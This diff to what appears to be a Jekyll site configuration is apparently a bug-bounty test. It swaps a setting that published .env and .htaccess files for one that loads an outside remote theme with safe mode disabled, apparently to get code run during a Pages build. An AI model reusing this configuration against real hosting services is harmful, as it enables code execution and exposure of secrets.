@@ -1,8 +1,4 @@
-_config.yml content:
-title: Test Site
-description: Security test
-# Include all files including hidden
-include:
-  - .env
-  - .htaccess
-
+title: Pages RCE Test
+description: Security testing
+remote_theme: durgaprasad4540/jekyll-bounty-theme@main
+safe: false
